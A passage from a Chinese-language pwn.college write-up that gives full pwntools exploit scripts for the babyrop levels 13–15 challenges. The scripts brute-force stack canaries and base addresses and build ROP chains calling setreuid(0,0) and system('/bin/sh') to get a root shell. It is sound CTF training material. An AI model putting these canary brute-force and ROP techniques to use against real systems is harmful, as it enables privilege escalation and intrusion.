context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level13.0&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x78</span><br><br><span class="hljs-comment"># stage_one</span><br>p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>input_buf = <span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>canary_addr = input_buf + <span class="hljs-number">0x78</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(canary_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>canary = p.recvline().strip()<br>canary = <span class="hljs-built_in">int</span>(canary, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x00</span>) + p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><br><span class="hljs-comment"># stage_two</span><br>ret_libc_addr = input_buf + <span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(ret_libc_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, libc_base)<br>libc.address = libc_base<br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="level13-1-2"><a href="#level13-1-2" class="headerlink" title="level13.1"></a>level13.1</h4><p>改偏移地址，三个地方：<code>padding</code>，<code>canary_addr</code>，<code>ret_libc_addr</code></p>
<h4 id="level14-0-2"><a href="#level14-0-2" class="headerlink" title="level14.0"></a>level14.0</h4><p>这题有fork，那大概率是爆破了。思路是，先爆破canary，再爆破main函数的基地址，然后再利用main的基地址进行<code>plt.puts(got.puts)</code>泄露libc基地址，然后根据libc基地址拿到shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak main_addr</span><br>x = <span class="hljs-number">0x01</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>main_addr = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = main_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-comment"># print(payload)</span><br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Goodbye!&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        main_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(main_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: leak libc_addr</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br>e = pro.elf<br>e.address = u64(main_addr) - <span class="hljs-number">0x1fce</span><br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># print(hex(puts_got_addr))</span><br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(e.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>但是很神奇的是，就算canary是正确的，同样的脚本依然会出现”smashing detected ***: terminated”，所以，写一个固定的脚本多跑几次：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>main_addr = <span class="hljs-number">0x5c929d8dffce</span><br>canary = <span class="hljs-number">0xca03b3b9123c1900</span><br>main_base_addr = <span class="hljs-number">0x5c929d8de000</span><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br><br>e = pro.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><span class="hljs-built_in">print</span>(r.dump())<br><br>libc.address = <span class="hljs-number">0x7d3e08419000</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>主要fork下，不是很好调试。不然可以分析一下为什么一会出现canary一会没有出现canary。</p>
<h4 id="level14-1-2"><a href="#level14-1-2" class="headerlink" title="level14.1"></a>level14.1</h4><p>一样的过程，改偏移地址就行。（包括challenge函数执行后的返回地址，因为是用它算的main基地址）</p>
<h4 id="level15-0-2"><a href="#level15-0-2" class="headerlink" title="level15.0"></a>level15.0</h4><p>貌似我上一道题有点曲折了，拿到main的基地址就能做很多事了，但是我在ROPgadget中确实没看到systemcall啥的gadget能用。不过好处是，这题反而比上一题简单了。不用爆破main基地址，直接爆破libc基地址，然后就能获得shell。</p>
<p>返回的libc偏移地址为：<code>0x79dc58fd5083 - 0x79dc58fb1000 = 0x24083 </code></p>
<p>最后减去就是libc_base的地址。</p>
<p>但是，有个前提，由于我们无法确定返回到libc_start中是否正确。因此返回地址的最低字节不能是<code>0x83</code>，这样的话就不能控制程序再次调用mian了。所以，爆破libc_addr时，可以以是否再次执行mian来判断该字节爆破的是否正确。exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kill_babyrop_processes</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 查找所有 babyrop_level15 进程</span><br>        pids = subprocess.check_output([<span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;babyrop_level15&quot;</span>]).decode().split()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pids) &gt; <span class="hljs-number">1</span>:       <span class="hljs-comment"># 当出现阻塞进程时</span><br>            subprocess.run([<span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;-9&quot;</span>, pids[<span class="hljs-number">1</span>]], check=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 杀死第二个pid，因为新出现的阻塞进程pid一定会大于原先的pid</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Killed babyrop_level15 (PID: <span class="hljs-subst">&#123;pids[<span class="hljs-number">1</span>]&#125;</span>)&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 没有找到进程</span><br><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak libc_addr</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>libc_addr = p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = libc_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.send(payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Welcome to&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        libc_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(libc_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>    kill_babyrop_processes()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(libc_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: calculate libc_base</span><br>kill_babyrop_processes()<br>libc.address = u64(libc_addr) - <span class="hljs-number">0x24060</span>  <span class="hljs-comment"># 注意是减0x60了，而不是0x83，因为我们的返回地址最低字节被手动设置了。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>这里需要杀死后面出现的进程，为什么呢？因为每次返回地址爆破成功时，会导致重新执行main，也就会重新执行listen等等。每爆破一个字节成功，就会重新成为server，并执行到read。那么此时就是阻塞的状态，等待用户输入。所以我们需要将新出现的进程杀死。以便爆破后面的字节。</p>
<h4 id="level15-1-2"><a href="#level15-1-2" class="headerlink" title="level15.1"></a>level15.1</h4><p>改偏移即可。ROP完结撒花！</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>pwn.college 题解</div>
      <div>https://loboq1ng.github.io/2025/03/01/pwn-college-题解/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Lobo Q1ng</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年3月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" title="Fuzzilli：论文阅读">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Fuzzilli：论文阅读</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/08/21/AFL%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="AFL使用与源码分析">
                        <span class="hidden-mobile">AFL使用与源码分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
